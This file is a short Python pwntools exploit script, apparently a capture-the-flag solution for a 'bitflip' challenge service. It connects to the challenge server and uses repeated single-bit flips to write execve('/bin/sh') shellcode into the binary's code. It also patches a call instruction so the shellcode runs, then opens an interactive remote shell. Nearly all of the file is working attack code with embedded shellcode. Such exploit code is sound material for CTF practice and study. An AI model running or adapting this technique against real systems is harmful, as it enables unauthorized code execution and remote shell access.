# USE 401296 4 => run more time
from pwn import *

io = remote('202.38.93.111',10231)
token = input('token: ')

print(io.recv())

io.send(token + '\n')

#io = process('bitflip')

print(io.recvline())
io.sendline('401296 4')

e = ELF('bitflip')

pos = 0x401405

data = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

ram = e.read(pos, len(data))

for i in range(len(data)):
    x = ram[i] ^ data[i]
    j = 0
    while x > 0:
        if x % 2 == 1:
            now = format(pos + i ,'x')
            io.sendline(f'{now} {j}')
            io.recvline()
            io.recvline()
        j += 1
        x >>= 1

data = b'\xe8\x66\x01\x00\x00'
pos = 0x40129a
ram = e.read(pos, len(data))

for i in range(len(data)):
    x = ram[i] ^ data[i]
    j = 0
    while x > 0:
        if x % 2 == 1:
            now = format(pos + i ,'x')
            io.sendline(f'{now} {j}')
            io.recvline()
            io.recvline()
        j += 1
        x >>= 1


io.recvuntil(b'p?')
io.interactive()

io.sendline('233333 9')

io.interactive()

